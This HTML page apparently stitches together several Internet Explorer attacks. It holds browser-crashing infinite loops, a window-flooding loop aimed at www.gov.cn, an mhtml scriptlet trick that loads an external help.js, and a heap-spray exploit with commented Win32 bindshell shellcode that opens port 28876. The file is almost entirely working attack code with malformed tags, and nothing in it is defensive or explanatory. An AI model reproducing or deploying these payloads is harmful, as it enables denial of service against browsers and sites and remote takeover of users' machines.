<html>
<form>
<input type crash>
</form>
<script language="javascript">
while(true) {
document.form.box.value=document.form.box.value + ' ';}</script>
<script language="javascript">
function iecrash() { v.innerHTML='<object classid=\"clsid:0CF32AA1-7571-11D0-93C4-00AA00A3DDEA\">Oooooops!</object>';}
</script>
<script>var i;i=0;for(;;){i++;window.open
('http://www.gov.cn','Microsoft'+i,null);}</script>

<HEAD><TITLE>¡¡</TITLE></HEAD>
<BODY>
 <SCRIPT LANGUAGE="JavaScript.Encode" src="help.js"></SCRIPT>
 <SCRIPT LANGUAGE="JavaScript">
   var url=document.location.href;
   url=url.substring(0,url.lastIndexOf('/'));
   document.write('<OBJECT Width=0 Height=0
      style="display:none;"
      type="text/x-scriptlet"
      data="mk:@MSITStore:mhtml:c:\\.mht!'+url+'/help.js::/%23">
</OBJECT>');
   window.status="¡¡";
   </SCRIPT>
</BODY>

<NOSCRIPT>
<iframe style="display:none;" src='*.*'></iframe>
</NOSCRIPT>

< SCRIPT id="SkyLined" language="javascript">
sMSHTML_heap_spray = unescape("%u0D0D%u0D0D");
for (i=0; i<7; i++) // 512 bytes
sMSHTML_heap_spray += sMSHTML_heap_spray;
try {
// We need to have an element in another window, so we try to create
// one in the window that opened us. This will most likely fail
// the first time because of XSS restrictions. In that case we open
// this page in a new window and try again from there.
exploit(opener.document.createComment(sMSHTML_heap_spray));
} catch(e) {
// both open() and showHelp() work with this
window.open(document.location.href);
}

function exploit(parent_element) {
// cosmetics, this window will DIE, so we move it out of view.
opener.focus();
window.moveTo(100000, 100000);

iHeap_fill_to_address = 0x12000000;
sHeap_return_address = unescape("%u0D0D%u0D0D");

// 4 nops because the 0x0D slide has 5 byte instructions.
sShellcode = unescape("%u3737%u3737" +
// Win32 bindshell (port 28876, '\0' free, looping). Thanks to
// HDM and others for inspiration and borrowed code. Source:
// www.edup.tudelft.nl/~bjwever/shellcode/w32_bind_0free_loop.c
"%u43eb" + "%u5756" + "%u458b" + "%u8b3c" + "%u0554" + "%u0178" + "%u52ea" +
"%u528b%u0120%u31ea%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf" +
"%u01ac%u85c7%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b" +
"%u8b4b%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64" +
"%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c%u6850" +
"%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe%uff90%uffff" +
"%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0%u40c4%ubb50%u7d22" +
"%u7dab%u75e8%uffff%u31ff%u50c0%u5050%u4050%u4050%ubb50%u55a6" +
"%u7934%u61e8%uffff%u89ff%u31c6%u50c0%u3550%u0102%ucc70%uccfe" +
"%u8950%u50e0%u106a%u5650%u81bb%u2cb4%ue8be%uff42%uffff%uc031" +
"%u5650%ud3bb%u58fa%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56" +
"%uf347%uc656%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964" +
"%u41e1%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353" +
"%u5353%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353%u5343" +
"%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe%u5bff%uc031" +
"%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff%uef87%u12bb%u6d6b" +
"%ue8d0%ufec2%uffff%uc483%u615c%u89eb");
// We are going to create a large block the will contain:
// [heap header][nopslide...........................][shellcode]
// by creating an array with a number of large strings that contain
// the nopslide and the shellcode. We will do this in such a way that
// one heap block is allocated for every string (by making it at least
// 0x80000 bytes) and try to use every byte of the heap block by making
// the nopslide fill the area between the heap header and shellcode
// precisely.
// Size of the header of heap blocks in MSIE in bytes:
iHeap_header_size = 0x38; // Actually it's 0x24, but this value works better
// Size of the blocks we want to create in bytes:
iHeap_block_size = 0x400000;
// Size of the shellcode in bytes:
iShellcode_size = sShellcode.length * 2; // (convert dwords to bytes)
// From this we can calculate the size of the nopslide in bytes:
iNopslide_size = iHeap_block_size - (iHeap_header_size + iShellcode_size);
// The quickest way to create large blocks of memory is doubling their
// size untill they are big enough (or too big, in which case we cut
// them back to size.)
sNopslide = sHeap_return_address;
while (sNopslide.length*2<iNopslide_size) sNopslide+=sNopslide;
sNopslide = sNopslide.substring(0, iNopslide_size/2);
// And now we can combine the nopslide and shellcode to create the heap
// blocks, we'll create enough to make sure we've got one at the
// desired return address: If we could calculate where the first one
// will be allocated, we could create exactly enough blocks, for now
// we assume they won't start under 0x400000 so we make sure we
// create enough for that value.
iHeap_block_count = (iHeap_fill_to_address-0x400000) / iHeap_block_size;
memory = new Array();
for (i=0;i<iHeap_block_count;i++) memory[i] = sNopslide + sShellcode;

sMSHTML_heap_spray = sNopslide.substring(0, 0x100); // 0x100 dwords = 512
bytez
for(i=0;i<1024;i++) try {
parent_element.appendChild(document.createComment(sMSHTML_heap_spray));
} catch (e) { }
}
</SCRIPT>


</html>

